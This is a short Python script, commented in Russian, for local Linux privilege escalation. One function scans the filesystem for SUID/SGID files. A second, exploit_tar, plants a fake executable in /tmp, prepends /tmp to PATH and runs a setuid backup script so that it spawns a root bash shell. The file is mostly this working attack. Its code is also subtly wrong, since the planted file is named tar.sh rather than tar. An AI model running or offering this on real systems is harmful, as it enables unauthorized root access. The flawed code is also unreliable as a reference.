import os, stat, subprocess

def find_suid_sgid(root='/'):
    """
    Проход по файловой системе и вывод путей к файлам с SUID/SGID.
    """
    for dirpath, dirnames, filenames in os.walk(root):
        for fname in filenames:
            path = os.path.join(dirpath, fname)
            try:
                st = os.stat(path)
            except PermissionError:
                continue  # нет прав на чтение — пропускаем
            mode = st.st_mode
            # Проверяем SUID‑бит
            if mode & stat.S_ISUID:
                print(f"[SUID] {path}")
            # Проверяем SGID‑бит
            if mode & stat.S_ISGID:
                print(f"[SGID] {path}")

def exploit_tar(script_path: str = "/usr/local/bin/mybackup"):
    # Создаём «зловредный» tar в /tmp
    with open("/tmp/tar.sh", "w") as f:
        f.write("#!/bin/bash\n/bin/bash\n")
    os.chmod("/tmp/tar.sh", 0o755)  # даём права +x

    # Подменяем PATH
    os.environ["PATH"] = "/tmp:" + os.environ.get("PATH", "")

    # Запускаем уязвимый скрипт
    subprocess.call([script_path])
    # В результате у нас попадает интерактивный bash с root‑привилегиями


if __name__ == "__main__":
    find_suid_sgid("/")  # запускаем поиск от корня